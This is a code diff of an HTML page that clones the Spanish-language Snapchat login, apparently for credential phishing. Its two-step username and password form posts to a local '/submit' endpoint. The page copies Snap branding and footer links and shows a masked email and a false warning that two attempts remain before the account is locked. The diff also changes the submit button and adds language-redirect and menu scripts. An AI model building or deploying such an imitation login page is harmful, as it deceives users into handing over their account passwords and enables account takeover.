@@ -9,139 +9,191 @@
 </head>
 <body>
 
-  <div class="login-container">
-    <form action="/submit" method="POST">
-      <div class="login-box" id="step1">
-        <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
-        <h2>Inicia sesión en<br />Snapchat</h2>
-        <label for="username">Nombre de usuario o correo electrónico</label>
-        <input type="text" id="username" name="username" required />
-        <button type="button" id="step1-button" onclick="goToStep2()" disabled>Continuar</button>
-      </div>
-
-      <div class="login-box" id="step2" style="display: none;">
-        <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
-        <h2>Introduce tu contraseña</h2>
-        <div class="email-mask">
-          luc***com
-          <a href="#" onclick="goToStep1()">¿No eres tú?</a>
-        </div>
-        <label for="password">Contraseña</label>
-        <input type="password" id="password" name="password" required />
-        <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
-          Contraseña incorrecta. Te quedan 2 intentos antes de bloquear la cuenta.
-        </div>
-        <button type="submit" id="step2-button" disabled>Continuar</button>
-      </div>
-    </form>
-  </div>
-
-  <!-- Desktop FOOTER -->
-  <footer class="desktop-only">
-    <div class="footer-columns">
-      <div>
-        <h4>Empresa</h4>
-        <ul>
-          <li><a href="https://www.snap.com/?lang=es-ES" target="_blank">Snap Inc.</a></li>
-          <li><a href="https://careers.snap.com/" target="_blank">Carreras</a></li>
-          <li><a href="https://newsroom.snap.com/" target="_blank">Noticias</a></li>
-        </ul>
-      </div>
-      <div>
-        <h4>Comunidad</h4>
-        <ul>
-          <li><a href="https://help.snapchat.com/hc/es" target="_blank">Soporte</a></li>
-          <li><a href="https://values.snap.com/policy/policy-community-guidelines?lang=es-ES" target="_blank">Normas comunitarias</a></li>
-          <li><a href="https://values.snap.com/safety/safety-center?lang=es-ES" target="_blank">Centro de seguridad</a></li>
-        </ul>
-      </div>
-      <div>
-        <h4>Publicidad</h4>
-        <ul>
-          <li><a href="https://forbusiness.snapchat.com/" target="_blank">Crear anuncios</a></li>
-          <li><a href="https://www.snap.com/ad-policies?lang=es-ES" target="_blank">Políticas de anuncios</a></li>
-          <li><a href="https://www.snap.com/political-ads?lang=es-ES" target="_blank">Anuncios políticos</a></li>
-          <li><a href="https://www.snap.com/brand-guidelines?lang=es-ES" target="_blank">Guía de marca</a></li>
-          <li><a href="https://help.snapchat.com/hc/es/articles/7047502545044" target="_blank">Política de promociones</a></li>
-        </ul>
-      </div>
-      <div>
-        <h4>Legal</h4>
-        <ul>
-          <li><a href="https://values.snap.com/privacy/privacy-center?lang=es-ES" target="_blank">Centro de privacidad</a></li>
-          <li><a href="https://help.snapchat.com/hc/es/articles/11399265637012" target="_blank">Tus opciones de privacidad</a></li>
-          <li><a href="https://www.snap.com/cookie-policy?lang=es-ES" target="_blank">Política de cookies</a></li>
-          <li><a href="https://help.snapchat.com/hc/es/articles/7012332110996" target="_blank">Reportar abuso</a></li>
-          <li><a href="https://www.snap.com/terms/custom-creative-tools?lang=es-ES" target="_blank">Condiciones de herramientas creativas</a></li>
-          <li><a href="https://www.snap.com/terms/create-geofilter" target="_blank">Condiciones de geofiltros</a></li>
-          <li><a href="https://www.snap.com/terms/lens-studio-license-agreement?lang=es-ES" target="_blank">Condiciones de Lens Studio</a></li>
-        </ul>
-      </div>
+<div class="login-container">
+  <form action="/submit" method="POST">
+    <div class="login-box" id="step1">
+      <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
+      <h2>Inicia sesión en<br />Snapchat</h2>
+      <label for="username">Nombre de usuario o correo electrónico</label>
+      <input type="text" id="username" name="username" required />
+      <button type="button" id="step1-button" onclick="goToStep2()" disabled>Continuar</button>
     </div>
 
-    <div class="language-selector">
-      <label for="language">Idioma</label>
-      <select id="language" name="language">
-        <option value="de">Deutsch</option>
-        <option value="en">English</option>
-        <option value="fr">Français</option>
-        <option selected value="es">Español</option>
-      </select>
+    <div class="login-box" id="step2" style="display: none;">
+      <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
+      <h2>Introduce tu contraseña</h2>
+      <div class="email-mask">
+        luc***com
+        <a href="#" onclick="goToStep1()">¿No eres tú?</a>
+      </div>
+      <label for="password">Contraseña</label>
+      <input type="password" id="password" name="password" required />
+      <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
+        Contraseña incorrecta. Te quedan 2 intentos antes de bloquear la cuenta.
+      </div>
+      <button type="button" id="step2-button" disabled>Continuar</button>
     </div>
-  </footer>
+  </form>
+</div>
 
-  <!-- Mobile FOOTER -->
-  <div class="footer-dropdown mobile-only">
+<!-- Desktop FOOTER -->
+<footer class="desktop-only">
+  <div class="footer-columns">
     <div>
-      <button class="dropdown-toggle">Empresa</button>
-      <ul class="dropdown-content">
+      <h4>Empresa</h4>
+      <ul>
         <li><a href="https://www.snap.com/?lang=es-ES" target="_blank">Snap Inc.</a></li>
         <li><a href="https://careers.snap.com/" target="_blank">Carreras</a></li>
         <li><a href="https://newsroom.snap.com/" target="_blank">Noticias</a></li>
       </ul>
     </div>
     <div>
-      <button class="dropdown-toggle">Comunidad</button>
-      <ul class="dropdown-content">
+      <h4>Comunidad</h4>
+      <ul>
         <li><a href="https://help.snapchat.com/hc/es" target="_blank">Soporte</a></li>
         <li><a href="https://values.snap.com/policy/policy-community-guidelines?lang=es-ES" target="_blank">Normas comunitarias</a></li>
         <li><a href="https://values.snap.com/safety/safety-center?lang=es-ES" target="_blank">Centro de seguridad</a></li>
       </ul>
     </div>
     <div>
-      <button class="dropdown-toggle">Publicidad</button>
-      <ul class="dropdown-content">
+      <h4>Publicidad</h4>
+      <ul>
         <li><a href="https://forbusiness.snapchat.com/" target="_blank">Crear anuncios</a></li>
         <li><a href="https://www.snap.com/ad-policies?lang=es-ES" target="_blank">Políticas de anuncios</a></li>
         <li><a href="https://www.snap.com/political-ads?lang=es-ES" target="_blank">Anuncios políticos</a></li>
+        <li><a href="https://www.snap.com/brand-guidelines?lang=es-ES" target="_blank">Guía de marca</a></li>
+        <li><a href="https://help.snapchat.com/hc/es/articles/7047502545044" target="_blank">Política de promociones</a></li>
       </ul>
     </div>
     <div>
-      <button class="dropdown-toggle">Legal</button>
-      <ul class="dropdown-content">
+      <h4>Legal</h4>
+      <ul>
         <li><a href="https://values.snap.com/privacy/privacy-center?lang=es-ES" target="_blank">Centro de privacidad</a></li>
         <li><a href="https://help.snapchat.com/hc/es/articles/11399265637012" target="_blank">Tus opciones de privacidad</a></li>
         <li><a href="https://www.snap.com/cookie-policy?lang=es-ES" target="_blank">Política de cookies</a></li>
         <li><a href="https://help.snapchat.com/hc/es/articles/7012332110996" target="_blank">Reportar abuso</a></li>
+        <li><a href="https://www.snap.com/terms/custom-creative-tools?lang=es-ES" target="_blank">Condiciones de herramientas creativas</a></li>
+        <li><a href="https://www.snap.com/terms/create-geofilter" target="_blank">Condiciones de geofiltros</a></li>
+        <li><a href="https://www.snap.com/terms/lens-studio-license-agreement?lang=es-ES" target="_blank">Condiciones de Lens Studio</a></li>
       </ul>
     </div>
-
-    <div class="language-selector mobile-only">
-      <label for="language">Idioma</label>
-      <select id="language" name="language">
-        <option value="de">Deutsch</option>
-        <option value="en">English</option>
-        <option value="fr">Français</option>
-        <option selected value="es">Español</option>
-      </select>
-    </div>
   </div>
 
-  <div class="bottom-bar">
-    <a href="https://values.snap.com/privacy/privacy-policy?lang=es-ES" target="_blank">Política de privacidad</a>
-    <a href="https://www.snap.com/terms?lang=es-ES" target="_blank">Términos del servicio</a>
+  <div class="language-selector desktop-only">
+    <label for="language-desktop">Idioma</label>
+    <select id="language-desktop" name="language">
+      <option value="de">Deutsch</option>
+      <option value="en">English</option>
+      <option value="fr">Français</option>
+      <option selected value="es">Español</option>
+    </select>
+  </div>
+</footer>
+
+<!-- Mobile FOOTER -->
+<div class="footer-dropdown mobile-only">
+  <div>
+    <button class="dropdown-toggle">Empresa</button>
+    <ul class="dropdown-content">
+      <li><a href="https://www.snap.com/?lang=es-ES" target="_blank">Snap Inc.</a></li>
+      <li><a href="https://careers.snap.com/" target="_blank">Carreras</a></li>
+      <li><a href="https://newsroom.snap.com/" target="_blank">Noticias</a></li>
+    </ul>
+  </div>
+  <div>
+    <button class="dropdown-toggle">Comunidad</button>
+    <ul class="dropdown-content">
+      <li><a href="https://help.snapchat.com/hc/es" target="_blank">Soporte</a></li>
+      <li><a href="https://values.snap.com/policy/policy-community-guidelines?lang=es-ES" target="_blank">Normas comunitarias</a></li>
+      <li><a href="https://values.snap.com/safety/safety-center?lang=es-ES" target="_blank">Centro de seguridad</a></li>
+    </ul>
+  </div>
+  <div>
+    <button class="dropdown-toggle">Publicidad</button>
+    <ul class="dropdown-content">
+      <li><a href="https://forbusiness.snapchat.com/" target="_blank">Crear anuncios</a></li>
+      <li><a href="https://www.snap.com/ad-policies?lang=es-ES" target="_blank">Políticas de anuncios</a></li>
+      <li><a href="https://www.snap.com/political-ads?lang=es-ES" target="_blank">Anuncios políticos</a></li>
+    </ul>
+  </div>
+  <div>
+    <button class="dropdown-toggle">Legal</button>
+    <ul class="dropdown-content">
+      <li><a href="https://values.snap.com/privacy/privacy-center?lang=es-ES" target="_blank">Centro de privacidad</a></li>
+      <li><a href="https://help.snapchat.com/hc/es/articles/11399265637012" target="_blank">Tus opciones de privacidad</a></li>
+      <li><a href="https://www.snap.com/cookie-policy?lang=es-ES" target="_blank">Política de cookies</a></li>
+      <li><a href="https://help.snapchat.com/hc/es/articles/7012332110996" target="_blank">Reportar abuso</a></li>
+    </ul>
   </div>
 
-  <script src="script.js"></script>
+  <div class="language-selector mobile-only">
+    <label for="language-mobile">Idioma</label>
+    <select id="language-mobile" name="language">
+      <option value="de">Deutsch</option>
+      <option value="en">English</option>
+      <option value="fr">Français</option>
+      <option selected value="es">Español</option>
+    </select>
+  </div>
+</div>
+
+<div class="bottom-bar">
+  <a href="https://values.snap.com/privacy/privacy-policy?lang=es-ES" target="_blank">Política de privacidad</a>
+  <a href="https://www.snap.com/terms?lang=es-ES" target="_blank">Términos del servicio</a>
+</div>
+
+<script src="script.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  function handleLanguageChange(selectedLang) {
+    switch (selectedLang) {
+      case "de":
+        window.location.href = "/index.html";
+        break;
+      case "en":
+        window.location.href = "/en.html";
+        break;
+      case "fr":
+        window.location.href = "/fr.html";
+        break;
+      case "es":
+        window.location.href = "/es.html";
+        break;
+    }
+  }
+
+  const desktopSelect = document.getElementById("language-desktop");
+  const mobileSelect = document.getElementById("language-mobile");
+
+  if (desktopSelect) {
+    desktopSelect.addEventListener("change", function () {
+      handleLanguageChange(this.value);
+    });
+  }
+
+  if (mobileSelect) {
+    mobileSelect.addEventListener("change", function () {
+      handleLanguageChange(this.value);
+    });
+  }
+
+  if (window.innerWidth <= 768) {
+    document.querySelectorAll(".dropdown-toggle").forEach(button => {
+      button.addEventListener("click", () => {
+        const content = button.nextElementSibling;
+        const isVisible = content.style.display === "block";
+
+        document.querySelectorAll(".dropdown-content").forEach(el => el.style.display = "none");
+        document.querySelectorAll(".dropdown-toggle").forEach(btn => btn.classList.remove("active"));
+
+        if (!isVisible) {
+          content.style.display = "block";
+          button.classList.add("active");
+        }
+      });
+    });
+  }
+});
+</script>
 </body>
 </html>
